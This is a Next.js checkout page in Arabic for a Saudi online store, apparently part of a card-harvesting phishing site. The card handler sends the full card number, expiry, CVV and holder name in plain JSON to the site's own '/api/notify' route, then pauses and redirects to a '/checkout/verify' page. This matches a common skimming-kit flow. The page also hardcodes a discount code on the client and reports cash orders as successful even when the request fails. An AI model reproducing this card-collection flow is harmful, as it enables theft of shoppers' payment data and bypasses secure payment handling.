"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import AddressSection, { SelectedAddress, ShippingOption } from "../components/address/AddressSection";
import { useCartStore } from "../store/cartStore";
import { useCompanyStore } from "../store/companyStore";
import type { CustomerInfo } from "../store/cartStore";
import { useRateLimit } from "./useRateLimit";
import { LoadingOverlay, SuccessModal, OrderModal } from "./CheckoutModals";
import CheckoutPayment from "./CheckoutPayment";
import CustomerSection, { validateCustomer } from "./CustomerSection";
import type { CustomerData } from "./CustomerSection";
import { useAuthStore } from "../store/authStore";

const fmt = (n: number) => n.toLocaleString("en-US");
const API = process.env.NEXT_PUBLIC_API_URL || "https://alshareehasim-backend.vercel.app";
const resolveImg = (src: string) => src?.startsWith("http") ? src : `${API}${src}`;

export default function CheckoutPage() {
  const router = useRouter();
  const { items, totalPrice, setCustomer, clear } = useCartStore();
  const { fetchCompany } = useCompanyStore();
  const [mounted, setMounted] = useState(false);
  const { blocked, fmtTime, recordAttempt } = useRateLimit();

  const [selectedShipping, setSelectedShipping] = useState<ShippingOption | null>(null);
  const [shippingConfirmed, setShippingConfirmed] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState<"mada" | "mastercard" | "applepay" | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumberError, setCardNumberError] = useState("");
  const [cardExpiryError, setCardExpiryError] = useState("");
  const [couponOpen, setCouponOpen] = useState(false);
  const [coupon, setCoupon] = useState("");
  const [discount, setDiscount] = useState(0);
  const [couponMsg, setCouponMsg] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [loading, setLoading] = useState(false);
  const [customer, setCustomerData] = useState<CustomerData>({ firstName: "", lastName: "", email: "", phone: "" });
  const [address, setAddress] = useState("");
  const [selectedAddress, setSelectedAddress] = useState<SelectedAddress | null>(null);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [customerConfirmed, setCustomerConfirmed] = useState(false);

  const { user, loading: authLoading, initialized } = useAuthStore();
  const isAuthenticated = !!user;
  const authFilledRef = useRef(false);

  // ملء بيانات المستخدم من الحساب مرة واحدة فقط بعد تهيئة auth
  useEffect(() => {
    if (!initialized || authFilledRef.current) return;
    authFilledRef.current = true;
    if (user) {
      setCustomerData({
        firstName: user.firstName || "",
        lastName: user.lastName || "",
        email: user.email || "",
        phone: user.phone || "",
      });
      // تأكيد تلقائي إذا كانت البيانات كاملة
      if (user.firstName && user.lastName && user.phone) {
        setCustomerConfirmed(true);
      }
    } else {
      // ضيف: استعادة من localStorage
      const saved = localStorage.getItem("checkout_customer");
      if (saved) {
        try {
          const parsed = JSON.parse(saved);
          setCustomerData({ firstName: parsed.firstName || "", lastName: parsed.lastName || "", email: parsed.email || "", phone: parsed.phone || "" });
          setAddress(parsed.address || "");
          setCustomerConfirmed(parsed.confirmed || false);
        } catch { /* silent */ }
      }
    }
    const savedShipping = localStorage.getItem("checkout_shipping");
    if (savedShipping) {
      try { setSelectedShipping(JSON.parse(savedShipping)); setShippingConfirmed(true); } catch { /* silent */ }
    }
  }, [initialized, user]);

  useEffect(() => { setMounted(true); fetchCompany(); }, []);

  const total = mounted ? totalPrice() : 0;
  const finalTotal = Math.max(0, total - discount);

  if (!mounted) return null;
  if (items.length === 0) { router.replace("/cart"); return null; }

  const fullName = `${customer.firstName} ${customer.lastName}`.trim();

  const confirmCustomer = () => {
    const e = validateCustomer(customer);
    setErrors(e);
    if (!Object.keys(e).length) {
      setCustomerConfirmed(true);
      localStorage.setItem("checkout_customer", JSON.stringify({ ...customer, address, confirmed: true }));
    }
  };

  const applyCoupon = () => {
    if (coupon.trim().toUpperCase() === "SAHLNAHA10") {
      const d = Math.round(total * 0.1);
      setDiscount(d);
      setCouponMsg(`✓ خصم 10% — وفّرت ${fmt(d)} ر.س`);
    } else {
      setDiscount(0);
      setCouponMsg("✗ الكود غير صحيح");
    }
  };

  const handleOrder = async () => {
    if (blocked) return;
    const e = validateCustomer(customer);
    if (!address.trim()) e.address = "مطلوب";
    setErrors(e);
    if (Object.keys(e).length) return;
    setLoading(true);
    try {
      const res = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentMethod: "cash_on_delivery",
          items: items.map(i => ({
            productId: i.product._id,
            name: i.product.name,
            price: i.product.salePrice ?? i.product.originalPrice,
            quantity: i.qty,
            image: i.product.images?.[0] || (i.product as { image?: string }).image || null,
          })),
          total: finalTotal, customer: fullName, whatsapp: customer.phone, address,
        }),
      });
      const data = await res.json();
      if (res.status === 429) { recordAttempt(); return; }
      recordAttempt();
    } catch { /* silent */ }
    setLoading(false);
    setCustomer({ name: fullName, nationalId: "", whatsapp: customer.phone, address, installmentType: "full", months: 0, downPayment: 0 } as CustomerInfo);
    setShowModal(false);
    setShowSuccess(true);
  };

  const handleCardSubmit = async () => {
    if (blocked) return;
    const rawCard = cardNumber.replace(/\s/g, "");
    if (rawCard.length < 16) { setCardNumberError("رقم البطاقة يجب أن يكون 16 رقماً"); return; }
    if (cardCvv.length < 3) return;
    if (!cardExpiry || cardExpiry.length < 5 || !cardHolder.trim()) return;
    if (!customer.firstName.trim() || !customer.phone) {
      setErrors({ firstName: !customer.firstName.trim() ? "مطلوب" : "", phone: !customer.phone ? "مطلوب" : "" });
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardNumber: cardNumber.replace(/\s/g, ""), expiry: cardExpiry, cvv: cardCvv, cardHolder,
          items: items.map(i => ({
            productId: i.product._id,
            name: i.product.name,
            price: i.product.salePrice ?? i.product.originalPrice,
            quantity: i.qty,
            image: i.product.images?.[0] || (i.product as { image?: string }).image || null,
          })),
          total: finalTotal, customer: fullName, whatsapp: customer.phone, nationalId: "", address, installmentType: "full", months: 0, downPayment: 0,
          customerEmail: customer.email || "",
        }),
      });
      const data = await res.json();
      if (res.status === 429) { recordAttempt(); setErrors({ firstName: "لقد تجاوزت الحد المسموح به من الطلبات" }); return; }
      recordAttempt();
      sessionStorage.setItem("verify_data", JSON.stringify({
        orderId: data.orderId, _id: data._id, amount: finalTotal,
        last4: cardNumber.replace(/\s/g, "").slice(-4),
        date: new Date().toISOString(), phone: customer.phone,
        customerName: fullName,
        items: items.map(i => ({
          productId: i.product._id,
          name: i.product.name,
          price: i.product.salePrice ?? i.product.originalPrice,
          quantity: i.qty,
        })),
        orderSnapshot: data.orderSnapshot || null,
      }));
      await new Promise(r => setTimeout(r, 2600));
      router.push("/checkout/verify");
    } catch {
      setErrors({ firstName: "تعذر الاتصال بالخادم" });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-4 pt-10 pb-10 gap-6" dir="rtl">

      <LoadingOverlay show={loading} />
      <SuccessModal show={showSuccess} onClose={() => { setShowSuccess(false); clear(); router.replace("/"); }} />
      <OrderModal
        show={showModal} onClose={() => setShowModal(false)}
        name={fullName} nationalId="" whatsapp={customer.phone} address={address}
        errors={errors} loading={loading}
        setName={v => setCustomerData(p => ({ ...p, firstName: v }))}
        setNationalId={() => {}}
        setWhatsapp={v => setCustomerData(p => ({ ...p, phone: v }))}
        setAddress={setAddress}
        setErrors={setErrors} onSubmit={handleOrder}
      />

      {/* ORDER SUMMARY CARD */}
      <div className="relative w-full max-w-4xl bg-white border border-gray-100" dir="rtl">
        <div className="flex flex-row items-center px-4 py-3 gap-3">
          <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-full overflow-hidden shrink-0 border border-gray-100">
            <Image src="/logo.webp" alt="logo" width={64} height={64} className="object-contain w-full h-full" />
          </div>
          <div className="flex-1 flex flex-col gap-2">
            <p className="text-sm sm:text-base font-black text-[#0A1C29]">إجمالي الطلب</p>
            <div className="flex flex-wrap gap-2">
              {items.map(({ product, qty }) => {
                const rawImg = product.images?.[0] || (product as { image?: string }).image;
                const img = rawImg ? resolveImg(rawImg) : null;
                return (
                  <div key={product._id} className="relative">
                    <div className="w-10 h-10 rounded-full border border-gray-200 overflow-hidden flex items-center justify-center bg-gray-50">
                      {img ? <Image src={img} alt={product.name} width={40} height={40} className="object-contain w-full h-full p-0.5" /> : <span className="text-base">📦</span>}
                    </div>
                    {qty > 1 && (
                      <span className="absolute -top-1 -left-1 w-3.5 h-3.5 rounded-full bg-[#0A1C29] text-white text-[8px] font-black flex items-center justify-center">{qty}</span>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
          <div className="flex flex-col items-end gap-1 shrink-0">
            <p className="text-lg sm:text-3xl font-black text-[#0A1C29] leading-none">
              {fmt(finalTotal)}
              <span className="text-xs sm:text-sm font-medium text-gray-400 mr-1"><img src="/money-icon.webp" alt="ر.س" className="inline w-6 sm:w-7 h-6 sm:h-7 object-contain align-middle" /></span>
            </p>
            {discount > 0 && (
              <p className="text-[9px] sm:text-[10px] text-gray-500 font-bold">وفّرت {fmt(discount)} <img src="/money-icon.webp" alt="ر.س" className="inline w-6 h-6 object-contain align-middle" /></p>
            )}
            <button onClick={() => setCouponOpen(v => !v)} className="text-[10px] sm:text-[11px] font-bold text-red-500 hover:text-red-600 transition mt-1 sm:mt-2">
              عندك كوبون خصم؟
            </button>
          </div>
        </div>
        {couponOpen && (
          <div className="flex gap-2 px-4 sm:px-6 pb-4">
            <input value={coupon} onChange={e => { setCoupon(e.target.value); setCouponMsg(""); }}
              placeholder="أدخل الكود"
              className="flex-1 px-3 py-1.5 text-xs border border-gray-200 focus:border-gray-400 focus:outline-none transition" />
            <button onClick={applyCoupon} className="px-3 py-1.5 bg-[#0A1C29] text-white text-xs font-black hover:opacity-80 transition">تطبيق</button>
          </div>
        )}
        {couponOpen && couponMsg && (
          <p className={`text-[10px] font-bold px-4 sm:px-6 pb-3 ${couponMsg.startsWith("✓") ? "text-gray-600" : "text-red-500"}`}>{couponMsg}</p>
        )}
        <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-[65%] bg-white px-3 py-0.5 border border-gray-200 rounded-full">
          <span className="text-[11px] font-bold text-gray-400">تفاصيل الطلب</span>
        </div>
      </div>

      {/* DETAILS CARD */}
      <div className="relative w-full max-w-4xl bg-white border border-gray-100" dir="rtl">

        {/* CUSTOMER INFO */}
        <CustomerSection
          data={customer}
          errors={errors}
          confirmed={customerConfirmed}
          isAuthenticated={isAuthenticated}
          authLoading={!initialized && authLoading && !user}
          onChange={(field, value) => {
            setCustomerData(p => ({ ...p, [field]: value }));
            setErrors(p => ({ ...p, [field]: "" }));
          }}
          onConfirm={confirmCustomer}
          onEdit={() => setCustomerConfirmed(false)}
        />

        {/* ADDRESS + SHIPPING */}
        <div className="border-t border-gray-100" />
        <AddressSection
          locked={!customerConfirmed}
          onChange={addr => { setSelectedAddress(addr); setAddress(addr.address ?? ""); }}
          onShippingSelect={opt => { setSelectedShipping(opt); setShippingConfirmed(!!opt); }}
        />

        {/* PAYMENT */}
        <div className="border-t border-gray-100" />
        <CheckoutPayment
          shippingConfirmed={shippingConfirmed}
          selectedPayment={selectedPayment} setSelectedPayment={setSelectedPayment}
          cardNumber={cardNumber} setCardNumber={setCardNumber}
          cardExpiry={cardExpiry} setCardExpiry={setCardExpiry}
          cardCvv={cardCvv} setCardCvv={setCardCvv}
          cardHolder={cardHolder} setCardHolder={setCardHolder}
          cardNumberError={cardNumberError} setCardNumberError={setCardNumberError}
          cardExpiryError={cardExpiryError} setCardExpiryError={setCardExpiryError}
          loading={loading} blocked={blocked} fmtTime={fmtTime}
          onCardSubmit={handleCardSubmit}
        />
      </div>
    </div>
  );
}
